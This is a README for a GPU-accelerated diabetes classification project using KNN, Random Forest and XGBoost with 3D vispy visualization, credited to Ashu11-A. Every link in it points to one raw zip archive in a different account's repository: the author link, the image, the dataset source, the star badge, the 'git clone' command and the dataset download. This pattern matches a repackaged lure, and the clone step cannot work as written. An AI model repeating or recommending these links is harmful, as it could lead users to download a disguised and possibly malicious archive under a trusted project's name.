<div align="center">

# My Machine Learn

![License](https://img.shields.io/github/license/Ashu11-A/My-Machine-Learn?style=for-the-badge&color=302D41&labelColor=f9e2af&logoColor=302D41)
![Stars](https://img.shields.io/github/stars/Ashu11-A/My-Machine-Learn?style=for-the-badge&color=302D41&labelColor=f9e2af&logoColor=302D41)
![Last Commit](https://img.shields.io/github/last-commit/Ashu11-A/My-Machine-Learn?style=for-the-badge&color=302D41&labelColor=b4befe&logoColor=302D41)
![Repo Size](https://img.shields.io/github/repo-size/Ashu11-A/My-Machine-Learn?style=for-the-badge&color=302D41&labelColor=90dceb&logoColor=302D41)

<br>

<p>
  <strong>Machine Learning Pipeline with GPU acceleration (NVIDIA CUDA) for diabetes classification, developed by <a href="https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip">@Ashu11-A</a>.</strong>
  <br><br>
  <sub>
    Training of multiple classifiers with <strong>Early Stopping</strong>,
    interactive 3D visualization rendered on the GPU via <strong>OpenGL (vispy)</strong>
  </sub>
</p>

<br>

<img width="600" height="337" alt="Visual graphs of trained models" src="https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip" />

<br><br>

<a href="https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip">
  <img src="https://img.shields.io/badge/Leave%20a%20Star%20🌟-302D41?style=for-the-badge&color=302D41&labelColor=302D41" alt="Star Repo">
</a>

</div>

---

## 📋 Table of Contents

- [About the Project](#-about-the-project)
- [Dataset](#-dataset)
- [Architecture](#-architecture)
- [Models Used](#-models-used)
- [Early Stopping](#-early-stopping)
- [Training Results](#-training-results)
- [3D GPU Visualization](#-3d-gpu-visualization)
- [Requirements](#-requirements)
- [Installation and Execution](#-installation-and-execution)

---

## 🧠 About the Project

This project implements a complete Machine Learning pipeline for **diabetes classification**, focusing on:

- **Full GPU Acceleration** — preprocessing, training, and rendering are executed in the video card's VRAM via NVIDIA CUDA and OpenGL.
- **Simultaneous model comparison** — three classification algorithms are trained and compared side-by-side.
- **Automated hyperparameter search** — Early Stopping with minimum improvement tolerance (`min_delta`) prevents search overfitting and premature stops due to noise.
- **Interactive 3D visualization** — plots display decision boundaries in 3D space (Insulin × Glucose × BMI), with a synchronized camera across all panels.

---

## 📊 Dataset

| Field        | Detail |
|:-------------|:-------|
| **Source** | [Kaggle — Diabetes Dataset (John Da Silva)](https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip) |
| **Samples** | 2,000 patients |
| **Features used** | `Insulin`, `Glucose`, `BMI` |
| **Target** | `Outcome` — `0` (non-diabetic) · `1` (diabetic) |
| **Split** | 70% train · 30% test (no shuffling, temporal order preserved) |
| **Scaling** | MinMaxScaler → `[-1, 1]` range in `float32` |

---

## 🏗️ Architecture

The project follows a layered architecture with a clear separation of responsibilities. Each layer is an independent Python subpackage:


```

My-Machine-Learn/
│
├── main.py                  ← single entry point
│
└── diabetes_ml/             ← project namespace
├── config.py                ← PipelineConfig (frozen dataclass)
├── pipeline.py              ← DiabetesMLPipeline (orchestrator)
│
├── data/
│   ├── dataset.py           ← ProcessedDataset (CPU + GPU arrays)
│   └── pipeline.py          ← DataPipeline (load → split → scale)
│
├── training/
│   ├── early_stopping.py    ← EarlyStopping + EarlyStoppingState
│   ├── wrappers.py          ← Strategy: GPUModelWrapper + 3 models
│   └── tuner.py             ← HyperparameterTuner (search loop)
│
└── visualization/
├── gpu_canvas.py            ← GPUScatterRow (vispy OpenGL)
├── grid.py                  ← DecisionBoundaryGrid (3D mesh on GPU)
├── subplots.py              ← ModelSubplotBuilder (Markers via OpenGL)
├── tuning_plot.py           ← TuningPlotBuilder (matplotlib)
└── interaction.py           ← DiabetesMLWindow (Qt window)

```

**Applied design patterns:**

| Pattern | Where |
|:--------|:------|
| **Strategy** | `GPUModelWrapper` — adding a new model requires only a new subclass |
| **Dataclass (frozen)** | `PipelineConfig` — immutable and hashable configuration |
| **Dependency Injection** | Shared camera injected into both `GPUScatterRow` components |
| **Single Responsibility** | Each file contains exactly one responsibility |

---

## 🤖 Models Used

### K-Nearest Neighbors (KNN) — via cuML

KNN classifies a point based on the **K nearest neighbors** in the feature space. For each new sample, the algorithm calculates the Euclidean distance to all training points and assigns the majority class among the closest K.

- **Searched hyperparameter:** `K` (number of neighbors) — values from 20 to 1,024
- **Library:** `cuml.neighbors.KNeighborsClassifier` (100% GPU execution)
- **Pros:** simple, no explicit training phase, interpretable
- **Cons:** slow inference for large datasets; sensitive to features on different scales (hence MinMaxScaler is essential)


```

Best K found: 26   →   Test accuracy: 77.83%

```

---

### Random Forest (RF) — via cuML

Random Forest is an **ensemble of decision trees** trained on random subsets of the data (bagging) and with random subsets of features at each split. The final prediction is made by majority voting among all trees.

- **Searched hyperparameter:** `n_estimators` (number of trees)
- **Fixed configuration:** `max_depth=5`, `random_state=42`
- **Library:** `cuml.ensemble.RandomForestClassifier` (parallel training on GPU)
- **Pros:** robust to overfitting, performs well without extensive tuning, naturally parallel
- **Cons:** less interpretable than a single tree; can be slow with many deep trees


```

Best N found: 254   →   Test accuracy: 80.33%

```

---

### Gradient Boosting (GB) — via XGBoost + CUDA

Gradient Boosting builds trees **sequentially**: each new tree is trained to correct the residual errors of the previous tree, minimizing a loss function via gradient descent.

- **Searched hyperparameter:** `n_estimators` (number of estimators/rounds)
- **Fixed configuration:** `max_depth=3`, `tree_method='hist'`, `device='cuda'`, `random_state=42`
- **Library:** `xgboost.XGBClassifier` with native CUDA backend
- **Pros:** generally the highest accuracy model among the three; efficient with `tree_method='hist'`; natively accepts CuPy arrays without CPU↔GPU transfer overhead
- **Cons:** more sensitive to hyperparameters; sequential training limits parallelism compared to RF


```

Best N found: 684   →   Test accuracy: 98.00%

```

---

## ⏱️ Early Stopping

The hyperparameter search uses **Early Stopping with a minimum improvement tolerance**, avoiding two common issues:

1. **Premature stopping due to noise** — small negative oscillations do not interrupt the search
2. **Unnecessarily long search** — if no model improves significantly for `patience_limit` consecutive steps, the search ends

```python
# diabetes_ml/config.py
patience_limit: int = 150    # steps without improvement before stopping
min_delta: float     = 0.01  # minimum improvement considered significant
initial_param: int   = 20    # initial value of the searched hyperparameter

```

**Decision logic at each step:**

```
new_accuracy - best_accuracy > min_delta?
    ├── YES → updates best, resets patience
    └── NO  → increments patience
               └── patience >= patience_limit → stops for this model

```

The three models are searched **in parallel** step by step. The global search ends when **all** models hit their patience limit.

---

## 📈 Training Results

| Model | Best Parameter | Best Accuracy (Test) |
| --- | --- | --- |
| KNN | K = 26 | **77.83%** |
| Random Forest | N = 254 | **80.33%** |
| Gradient Boosting | N = 684 | **98.00%** |

**Gradient Boosting via XGBoost** achieved the highest accuracy, which is expected given that boosting algorithms tend to outperform bagging methods and simple instances when the data has complex non-linear relationships between features.

---

## 🎮 3D GPU Visualization

The visualization was reimplemented from **matplotlib 3D (CPU)** to **vispy OpenGL (GPU)**:

| Aspect | Matplotlib (before) | vispy OpenGL (now) |
| --- | --- | --- |
| Rendering | Software (CPU) | OpenGL (GPU/VRAM) |
| Framerate when rotating | Low (~2–5 fps) | High (60+ fps) |
| Data buffer | Recalculated every frame | Sent once to VRAM |
| Synchronization | Event callbacks | Shared camera object |

**Color legend:**

| Color | Meaning |
| --- | --- |
| 🔵 Blue | Class 0 — correct prediction |
| 🔴 Red | Class 1 — correct prediction |
| 🟢 Mint Green | Class 0 — incorrect prediction |
| 🟡 Yellow | Class 1 — incorrect prediction |

---

## 📦 Requirements

* UV (package and project manager)
* NVIDIA GPU with CUDA support `>= 11.8`
* CUDA Toolkit installed on the system

**Main dependencies:**

| Package | Usage |
| --- | --- |
| `cuml` | GPU-accelerated KNN and Random Forest |
| `xgboost` | Gradient Boosting with CUDA backend |
| `cupy` | Arrays in VRAM and GPU↔CPU transfers |
| `vispy` | 3D Rendering via OpenGL |
| `PyQt5` / `PyQt6` | Window backend for vispy + matplotlib |
| `matplotlib` | Fine Tuning Plot (accuracy vs parameter) |
| `scikit-learn` | `train_test_split`, `MinMaxScaler` |
| `pandas` / `numpy` | Data manipulation |

---

## 🚀 Installation and Execution

```bash
# 1. Clone the repository
git clone https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip
cd My-Machine-Learn

# 2. Place the dataset in the project root
#    Download at: https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip

# 3. Install dependencies
uv sync

# 4. Run
uv run main.py

```

To customize the search parameters without modifying the code:

```python
from diabetes_ml.config import PipelineConfig
from diabetes_ml.pipeline import DiabetesMLPipeline

cfg = PipelineConfig(
    patience_limit=200,
    min_delta=0.005,
    initial_param=10,
)
DiabetesMLPipeline(cfg).run()


```
